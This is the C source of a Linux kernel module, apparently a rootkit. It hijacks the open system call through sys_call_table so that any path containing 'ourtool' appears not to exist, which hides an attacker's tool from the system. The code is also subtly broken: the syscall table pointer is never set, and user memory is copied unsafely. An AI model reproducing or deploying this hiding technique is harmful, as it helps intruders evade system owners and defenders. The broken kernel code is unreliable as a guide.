
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/slab.h>
#include <linux/unistd.h>

#include <r0mod/global.h>

void **sys_call_table;

asmlinkage int (*orig_open)(const char *pathname, int flag, mode_t mode);

asmlinkage int my_open(const char *pathname, int flag, mode_t mode)
{
    char hide[] = "ourtool";
    char *kernel_pathname;

    // Convert to kernel space
    kernel_pathname = (char *)kmalloc(256, GFP_KERNEL);
    memcpy(kernel_pathname, pathname, 255);
    if(strstr(kernel_pathname, (char *)&hide) != NULL)
    {
        kfree(kernel_pathname);
        // Return error code, 'file does not exist'
        return -ENOENT;
    }
    else
    {
        kfree(kernel_pathname);
        // All OK, this is not our tool
        return orig_open(pathname, flag, mode);
    }

    return 0;
}

static int __init r0mod_init(void)
{
    printk("Module starting...");

    printk("old open addr = %p", sys_call_table[__NR_open]);
    orig_open = sys_call_table[__NR_open];
    printk("orig_open addr = %p", orig_open);
    printk("my_open addr = %p", my_open);
    sys_call_table[__NR_open] = my_open;
    printk("new open addr = %p", sys_call_table[__NR_open]);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...");

    printk("old open addr = %p", sys_call_table[__NR_open]);
    sys_call_table[__NR_open] = orig_open;
    printk("new open addr = %p", sys_call_table[__NR_open]);
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
